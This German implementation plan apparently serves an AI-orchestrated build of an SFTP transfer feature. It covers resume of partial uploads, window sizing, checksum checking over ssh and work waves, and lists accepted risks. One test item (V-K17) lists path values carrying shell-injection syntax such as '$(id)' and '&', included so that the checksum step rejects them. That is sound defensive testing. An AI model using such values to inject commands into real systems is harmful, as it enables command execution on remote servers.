| V-K13 | `src/main/files/sftp-loopback.test.ts` | Keine festen Fensterzahlen: `import { windowBytes } from './transfer'`. (a) Upload-Resume erwartet `resumedFrom: 8 * MiB - windowBytes()`. (b) Das gekippte Byte bei 3,5 MiB liegt in `[8 MiB − W − 1 MiB, 8 MiB − W)` und führt zu `restarted`, das Byte bei 6 MiB liegt nach R. (c) „Abbrechen behält“: Die `.part`-Größe `S` wird nach dem Abbruch per `statSync` gemessen (bei 31-KiB-Stücken 8 412 160), danach `resumedFrom: S - windowBytes()`. (d) Download-Resume wie (a). Sonst Spec 8.2 und K10. |
| V-K14 | `docs/handbuch.md`, `docs/manual.md` | Sätze wörtlich wie in 1.7 („knapp vier Megabyte“, Satz zu den Sonderzeichen). Sonst Spec 7.4 und K12. Im CHANGELOG kommt keine Megabyte-Zahl vor, er bleibt wie in Spec 7.4. |
| V-K15 | `src/shared/locales/*/errors/files.json` | Zusätzlich `verifyUnsafeName` (1.7). |
| V-K16 | `src/main/files/transfer.test.ts` | Test „W never shrinks“: `expect(windowBytes()).toBeGreaterThanOrEqual(128 * 31 * 1024)` mit Standard-`TUNING`, Kommentar `// R16: lowering W breaks resuming .part files of earlier versions.` Spec E7 („TUNING in den Einstellungen“) darf W nie unter diesen Wert senken. Das gehört zu R16. |
| V-K17 | `src/main/files/verify.test.ts` | Zusätzlich zu Spec 8.3: (f) Das exakte Kommando aus 1.6 als String-Vergleich. (g) Die Pfade `/srv/a&b.bin`, `/srv/x\\y.bin`, `/srv/$(id).bin`, `/srv/a\nb.bin` und `/srv/a!.bin` führen zu `files.verifyUnsafeName`, und `exec` wurde nicht aufgerufen. (h) Die Ausgabe `Welcome\n<64 hex>  /srv/a.bin\n` liefert den Digest. (i) Ein Stream-`error` führt zu `verifyUnavailable`. |
| V-K18 | `.claude/skills/run-app/fakes.test.mjs` | Test über `startSshd`: `exec` mit dem Kommando aus 1.6 für eine Datei unter `home/demo` liefert `<sha256>  <pfad>`. Ein Pfad mit `'` (gequotet) funktioniert, eine fehlende Datei endet mit Code 1. |

## 4. Wellen (endgültig)

Jede Datei gehört je Welle genau einem Task. `sftp-session.ts` gehört in Welle 1 zu A und in Welle 2 zu F, und F ergänzt dort nur `verify`. Nach jeder Welle laufen `npm run typecheck` und `npx vitest run` grün, danach ein Commit je Task.

| Welle | Task | Dateien (exklusiv) | Pflichtpunkte |
|---|---|---|---|
| 0 | D0 Fake-Server | `.claude/skills/run-app/sshd.mjs`, `.claude/skills/run-app/fakes.test.mjs` | Spec 7.5 (Latenz), V-K10, V-K18. Danach folgt die **Vorher-Messung** durch den Orchestrator mit dem heutigen Build: `SSHD_LATENCY_MS=10`, `screens.mjs sftp`, Rate aus `sftp-transfer.png` ins Ledger, erwartet ≈ 3 MB/s. Sie muss vor dem Merge von Welle 1 erfolgen. |
| 1 | A Kern und Verträge | `src/shared/sftp.ts`, `src/shared/ipc.ts`, `src/preload/index.ts`, `src/main/files/file-system.ts`, `src/main/files/sftp-file-system.ts`, `src/main/files/sftp-file-system.test.ts`, `src/main/files/transfer.ts`, `src/main/files/transfer.test.ts`, `src/main/files/auto-upload.test.ts`, `src/main/files/sftp-session.ts` | Vertrag 1.1–1.5 wörtlich, Spec 3–5, 7.1, 7.2 und 8.1, 8.4. K1–K6, K8, K9 (Inhalt nach Spec 4.5) sowie V-K1–V-K8, V-K11, V-K12, V-K16. `auto-upload.ts`, `remote-edit.ts`, `ipc.ts` (Main), Renderer und Locales bleiben unberührt. Der Rate-Test läuft mit `TUNING.chunk = 1024`, im Rumpf unverändert. Fakes in `auto-upload.test.ts` wie Spec 8.4, dazu `openRead` nur, falls ein Testfall es braucht. |
| 1 | C Doku und Version | `docs/handbuch.md`, `docs/manual.md`, `CHANGELOG.md`, `CHANGELOG.en.md`, `package.json`, `package-lock.json` | Spec 7.4, K12 und V-K14. Kein Fettdruck und keine Backticks im CHANGELOG. `## [0.18.0] – 2026-10-21`. `npm run version:minor` → 0.18.0. |
| 1 | D run-app | `.claude/skills/run-app/screens.mjs`, `.claude/skills/run-app/SKILL.md` | Spec 7.5 und K11. Knopftexte „Fortsetzen“ und „Prüfen“, die Texte „fortgesetzt ab“ und „Prüfsumme stimmt“. Ausgeführt wird D erst nach Welle 2 gegen einen frischen Build. Wird das Fenster für den Abbruch zu knapp (Risiko 10 der Spec), wird `big.bin` 1 GiB groß. |
| 2 | B Renderer und Texte | `src/renderer/src/components/FilesPanel.tsx`, `src/shared/locales/de-DE/files.json`, `src/shared/locales/en-US/files.json`, `src/shared/locales/de-DE/errors/files.json`, `src/shared/locales/en-US/errors/files.json` | Renderer-Vertrag der ersten Validierung (K7) mit `partials` (Spec 7.3), Keys aus Spec 7.4, K12-Keys und V-K15. Kein CSS, kein Token, keine deutschen Literale im Code. |
| 2 | E Loopback | `src/main/files/sftp-loopback.test.ts` | Spec 8.2, K10, V-K13. Der Testserver beantwortet CLOSE auch bei angehaltenen Writes sofort. |
| 2 | F Prüfen (Main) | `src/main/files/verify.ts` (neu), `src/main/files/verify.test.ts` (neu), `src/main/files/ipc.ts`, `src/main/files/sftp-session.ts` (nur `verify`) | Spec 6 und 8.3, Vertrag 1.6, V-K9, V-K17. Nutzt `VERIFY_MAX` aus A. |

Abhängigkeiten: B, E und F brauchen A. D0 steht allein und muss vor der Vorher-Messung liegen. Gate nach Welle 2: Typecheck, Vitest und run-app `sftp` mit `SSHD_LATENCY_MS=10`. Angesehen werden `sftp-transfer-canceled.png` (zwei Knöpfe), `sftp-transfer.png` (Rate, „fortgesetzt ab“, laufende Datei) und `sftp-transfer-verified.png` („Prüfsumme stimmt“). Die Rate aus dem Protokoll kommt als Nachher-Wert ins Ledger, und der Node-SHA-Vergleich muss bestehen.

## 5. Offene Risiken (hingenommen)

1. **R16 bleibt eine Regel.** Der Test V-K16 hält den Standardwert fest. Eine `.part` von einem fremden Build mit größerem W ist nicht erkennbar.
2. **Wartezeit anderer Anfragen:** Bei 4 großen Dateien stehen bis zu ≈ 14 MiB in ssh2 `_buffer` vor Listing, Bearbeiten und Auto-Upload desselben Kanals, bei 10 Mbit/s Upload also bis zu ≈ 12 s. Abhilfe später: ein gemeinsames Fenster über alle Arbeiter. Die Spanne je Datei bliebe dabei ≤ W, R16 wäre nicht berührt.
3. **Stummer Server nach Abbruch:** Nach 10 s gibt `settle` auf, und der Handle bleibt bis zum Ende der Sitzung offen. Wacht der Server später auf, landen die alten WRITEs vor jeder neuen Anfrage des Kanals (gleiche Daten, Lage ≥ `oldest`). Server, die außer der Reihe arbeiten, könnten sie nach einem neuen Lauf auf dieselbe `.part` anwenden. Bei gleicher Quelle ist der Inhalt identisch, bei geänderter Quelle greift R3 (mtime → Neustart).
4. **Link-Kollision:** Zwei Quellen, deren vorhandene Ziele über `realpath` auf dieselbe Datei zeigen, werden weiterhin parallel in eine `.part` geschrieben. Das ist sehr selten, V-K7 deckt nur Groß-/Kleinschreibung ab.
5. **`limits@openssh.com` mit kleinerem `max-write` als 31 KiB:** Dann zerlegt ssh2 wieder. Das ist für keinen verbreiteten Server bekannt.
6. **Prüfen bei Sonderzeichen:** Namen außerhalb der Positivliste (`&`, `$`, `!`, `\`, `%`, `;`, Steuerzeichen, Anführungszeichen außer `'`) brechen das Prüfen des Jobs mit `files.verifyUnsafeName` ab.
7. **Ein lügender Server** kann bei „Prüfen“ „stimmt“ melden. Belegt wird die Übertragung, nicht die Ehrlichkeit des Servers.
8. **Prüfen an alten Zeilen:** Nach „Neu verbinden“ zeigen fertige Jobs der alten Sitzung weiter „Prüfen“. Ein Klick tut nichts, weil die neue Sitzung den Job nicht kennt (`verify` kehrt still zurück).
9. **Symlink als `x.part`:** Er wird als Datei behandelt (fortgesetzt oder gelöscht). Wer im Zielordner schreiben darf, kann ihn anlegen. Gleichwertig zum heutigen `'w'` durch den Link.
10. **Rückkehr der Ordnerphase:** Bei einem Abbruch in der ersten Konfliktfrage bleiben leere Ordner stehen (Spec-Risiko 4). `job.current` ist während der Ordnerphase leer.
11. Die Spec-Risiken 3, 5–8, 10–12 und die Validierungsrisiken 1–9 der ersten Validierung bleiben.

Rulings dieser Stufe: **V1** Stück 31 KiB statt 32 KiB (N7 „etwa 4 MB“). **V2** Schließen nach Abbruch oder Fehler wartet höchstens 10 s, im Erfolgsfall unbegrenzt und mit Fehler. **V3** Prüfen nur für Namen aus der Positivliste, über `sh -c`. **V4** Bei Zielen, die sich nur in der Groß-/Kleinschreibung unterscheiden, ist die Dateiparallelität des Jobs 1. **V5** `VERIFY_MAX` gehört zu Task A.
